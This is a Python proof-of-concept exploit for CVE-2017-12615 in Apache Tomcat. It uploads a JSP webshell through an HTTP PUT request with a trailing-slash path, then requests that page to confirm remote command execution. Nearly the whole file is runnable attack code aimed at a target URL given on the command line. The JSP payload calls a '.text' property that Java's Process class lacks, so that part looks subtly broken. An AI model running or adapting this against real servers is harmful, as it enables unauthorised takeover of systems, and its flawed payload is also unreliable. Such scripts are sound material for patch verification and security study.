#!/usr/bin/env python3
"""
Tomcat PUT RCE (CVE-2017-12615) PoC
Upload JSP webshell via HTTP PUT in Tomcat 7.0.0-7.0.81
"""
import sys
import urllib.request

def exploit(target_url: str):
    print(f"[*] Target: {target_url}")
    print(f"[*] CVE-2017-12615 - Tomcat PUT RCE")
    print()

    jsp_content = b'<%out.println("uid: "+Runtime.getRuntime().exec("id").text);%>'
    shell_path = "/test_poc.jsp/"

    put_url = f"{target_url}{shell_path}"
    print(f"[*] Uploading JSP webshell via PUT to {put_url}")

    try:
        req = urllib.request.Request(put_url, data=jsp_content, method='PUT')
        req.add_header('Content-Type', 'application/octet-stream')
        resp = urllib.request.urlopen(req, timeout=10)
        print(f"[+] PUT response status: {resp.status}")
    except urllib.error.HTTPError as e:
        if e.code in (201, 204):
            print(f"[+] Upload successful (status {e.code})")
        else:
            print(f"[-] PUT failed with status {e.code}")
            return
    except Exception as e:
        print(f"[-] Error uploading: {e}")
        return

    verify_url = f"{target_url}/test_poc.jsp"
    print(f"[*] Verifying shell at {verify_url}")
    try:
        req = urllib.request.Request(verify_url, method='GET')
        resp = urllib.request.urlopen(req, timeout=10)
        body = resp.read().decode('utf-8', errors='replace')
        print(f"[+] Shell output: {body.strip()}")
        if 'uid' in body:
            print("[+] SUCCESS: Remote code execution confirmed!")
        else:
            print("[!] Shell uploaded but output unclear")
    except Exception as e:
        print(f"[-] Could not verify shell: {e}")

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:9033"
    exploit(url)
